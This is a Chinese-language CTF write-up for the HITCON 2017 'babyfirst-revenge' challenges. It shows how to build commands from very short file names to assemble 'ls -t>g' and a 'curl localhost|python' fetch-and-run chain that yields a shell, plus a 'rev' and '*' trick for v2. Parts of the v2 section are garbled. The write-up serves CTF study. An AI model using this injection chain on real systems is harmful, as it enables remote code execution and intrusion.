### 0x01 babyfirst-revenge
源码:
    g
    >-t\
    >\>g
    >l\
    >s\ \
    ls>c
    ls>>c
通过上面的命令就能成功的将`ls -t>g`的命令写入文件`c`中.  
先看在执行`ls>>c`之前的目录文件情况.  
emm...这里有一个很奇怪的点,由于`ls`的命令结果默认是根据文件名进行排序的,而这里可以看出表现出来的并不正确,可是在`c`文件中的顺序却是正确(如果直接在命令行中执行就是错误的),这里一直让我很困惑(希望dalao能解答下).  
在执行`ls>>c`之后的情况如下.  
可以从看出`ls -t>g`的命令已经写入进去了.这里其实还有一个是注意文件名,如果文件名出现在`-t\`、`>g`或`l\`、`s
\`之间的,就不难发现会出现一个乱序的情况,这样就无法构成完整的命令.  
接下来就是构造`curl`请求以及执行文件了.
    # curl localhost|python
    >on
    >th\
    >py\
    >\|\
    >st\
    >ho\
    >al\
    >oc\
    >l\
    >\ \
    >rl\
    >cu\
之后`sh c`执行之后.查看`g`文件.  
可以看出上面也组成了`curl`的完整命令.之后`sh g`执行命令.  
成功GetShell.
### 0x02 babyfirst-revenge-v2
源码:
    g`这个命令进行何种切割,`>\>\`和`>\
\`是必然作为单独的部分,这样由于`ls`按照文件名进行排序,所以虽然可以呈现`space\ -t\ >\ ?
ls`,但是`ls>>?`这个是没有办法实现的.  
因此这里使用其它得方法，可以通过`rev`逆序之后解决.  
其中`ls -t>g`这个命令不能逆序,由于`t`是比`s`大的，如果逆序`s`不会在`t`的前面,所以这里使用`ls -th>g`.
关于`*`命令:  
`*` 相当于`$(dir *)`,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入.  
所以这样如果`dir`在最前面的话,就可以把当前目录的文件都返回.
    >dir
    >sl
    >g\>
    >ht-
之后将`*`的结果写入文件中,紧接着写入`rev`文件.
    >*>v
    >rev
最后执行`rev v>u`,这个命令需要通过`*`命令的其它形式实现.
    *v>u
    这个命令就是$(dir *v)>u,dir *v返回的就是结尾为v的文件.
这个地方其实是一个很巧妙的方式,因为`*v`恰好是可以匹配到`rev`和`v`的,如果文件名换成其它字母会因为排序错误或者没有作为`rev`的参数而逆序失败.  
之后的步骤就没有什么多大的区别了.
### 0x03
路漫漫呀....  
欢迎有新思路的daolao交流...  
[官方exp-babyfirst-revenge](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge/exploit.py)  
[官方exp-babyfirst-revenge-v2](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py)